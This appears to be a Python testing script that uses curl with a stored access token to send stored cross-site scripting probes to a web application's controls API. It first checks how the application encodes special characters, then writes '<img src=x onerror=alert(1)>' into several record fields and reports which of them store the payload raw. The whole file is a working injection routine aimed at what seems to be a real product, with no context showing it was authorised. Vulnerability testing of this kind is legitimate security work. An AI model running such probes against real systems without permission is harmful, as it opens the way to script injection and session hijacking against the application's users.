import json,subprocess,os,uuid
H=os.environ['H']; BB=os.environ['BB']
T=open('/tmp/bac_OWNER').read().strip()
def req(m,p,body=None,tok=None):
    cmd=['curl','-s','-m','30','-o','/tmp/b','-w','%{http_code}','-X',m,H+p,
         '-H','token: '+(tok or T),'-H',BB,'-H','Content-Type: application/json',
         '-H','X-Auditboard-Product: System']
    if body is not None: cmd+=['-d',json.dumps(body)]
    c=subprocess.run(cmd,capture_output=True,text=True).stdout.strip()
    return c, open('/tmp/b',encoding='utf-8',errors='replace').read()
tag='zx'+uuid.uuid4().hex[:6]
print("=== encoding behaviour: what exactly happens to < > \" ' & ? ===")
probe=f'<b>"q"\'s\'&amp;{tag}'
c,b=req('PUT','/api/v1/controls/1',{"control":{"control_objective":probe}})
c2,b2=req('GET','/api/v1/controls/1')
try:
    o=json.loads(b2)['controls'][0]
    print(f"  input : {probe!r}")
    print(f"  stored: {o.get('control_objective')!r}")
except Exception as e: print("  err",e)
print()
print("=== fields NOT entity-encoded? (raw JSON passthrough candidates) ===")
# field_data / multiselect / custom fields may be stored as JSON blobs
tests=[
 ('field_data',{"control":{"field_data":{"x":f'<img src=x onerror=alert(1)>{tag}'}}}),
 ('risk_statement',{"control":{"risk_statement":f'<img src=x onerror=alert(1)>{tag}'}}),
 ('id_code',{"control":{"id_code":f'<img src=x onerror=alert(1)>{tag}'}}),
]
for label,body in tests:
    c,b=req('PUT','/api/v1/controls/1',body)
    c2,b2=req('GET','/api/v1/controls/1')
    raw = '<img src=x onerror' in b2
    print(f"  {label:16} PUT={c} raw_stored={raw}")
    if raw:
        try:
            o=json.loads(b2)['controls'][0]
            print(f"      STORED RAW: {str(o.get(label))[:200]}")
        except: pass
